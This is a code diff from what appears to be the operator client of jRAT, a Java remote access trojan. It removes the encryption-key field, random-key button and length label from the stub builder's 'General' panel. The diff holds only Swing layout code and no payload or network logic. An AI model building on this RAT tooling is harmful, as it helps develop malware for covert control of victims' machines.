@@ -4,12 +4,8 @@ import io.jrat.client.Help;
 import io.jrat.client.listeners.SocketComboBoxListener;
 import io.jrat.client.net.PortListener;
 import io.jrat.client.settings.Settings;
-import io.jrat.client.ui.components.EncryptionKeyJTextField;
 import io.jrat.client.ui.components.PortListenerJComboBox;
-import io.jrat.common.crypto.Crypto;
-import io.jrat.common.utils.Utils;
 
-import java.awt.Color;
 import java.awt.event.ActionEvent;
 import java.awt.event.ActionListener;
 
@@ -32,8 +28,6 @@ public class PanelBuildGeneral extends JPanel {
 
 	public JPasswordField passPass;
 	public JTextField txtID;
-	private EncryptionKeyJTextField txtKey;
-	private JLabel lblLength;
 	private JComboBox<?> comboBox;
 
 	public String getPass() {
@@ -80,9 +74,6 @@ public class PanelBuildGeneral extends JPanel {
 		passPass = new JPasswordField(Settings.getGlobal().getString("bpass"));
 		passPass.setBounds(147, 32, 174, 20);
 
-		JLabel lblEncryptionKey = new JLabel("Encryption key");
-		lblEncryptionKey.setBounds(72, 60, 71, 14);
-
 		JButton btnShowPassword = new JButton("Show password");
 		btnShowPassword.setBounds(147, 117, 107, 23);
 		btnShowPassword.addActionListener(new ActionListener() {
@@ -103,42 +94,8 @@ public class PanelBuildGeneral extends JPanel {
 		panel.add(lblSecurityPassword);
 		panel.add(passPass);
 		panel.add(btnShowPassword);
-		panel.add(lblEncryptionKey);
 		panel.add(button);
-
-		JButton button_2 = new JButton("");
-		button_2.addActionListener(new ActionListener() {
-			public void actionPerformed(ActionEvent arg0) {
-				txtKey.setText(Utils.randomString(Crypto.KEY_LENGTH));
-				txtKey.onUpdate(true);
-			}
-		});
-		button_2.setIcon(new ImageIcon(PanelBuildGeneral.class.getResource("/icons/random.png")));
-		button_2.setBounds(193, 81, 37, 25);
-		panel.add(button_2);
-
-		txtKey = new EncryptionKeyJTextField() {
-			@Override
-			public void onUpdate(boolean correct) {
-				lblLength.setText(txtKey.getText().length() + "");
-
-				if (correct) {
-					lblLength.setForeground(Color.green);
-				} else {
-					lblLength.setForeground(Color.red);
-				}
-			}
-		};
-		txtKey.setBounds(147, 57, 174, 20);
-		panel.add(txtKey);
-		txtKey.setColumns(10);
 		setLayout(groupLayout);
-
-		txtKey.setText(Settings.getGlobal().getString("bkey").length() == Crypto.KEY_LENGTH ? Settings.getGlobal().getString("bkey") : Utils.randomString(Crypto.KEY_LENGTH));
-
-		lblLength = new JLabel(txtKey.getText().length() + "");
-		lblLength.setBounds(331, 60, 46, 14);
-		panel.add(lblLength);
 
 		comboBox = new PortListenerJComboBox(new SocketComboBoxListener() {
 			@Override
@@ -153,6 +110,5 @@ public class PanelBuildGeneral extends JPanel {
 		JLabel lblLoad = new JLabel("Load");
 		lblLoad.setBounds(120, 149, 23, 14);
 		panel.add(lblLoad);
-		txtKey.onUpdate(txtKey.getText().length() == Crypto.KEY_LENGTH);
 	}
 }
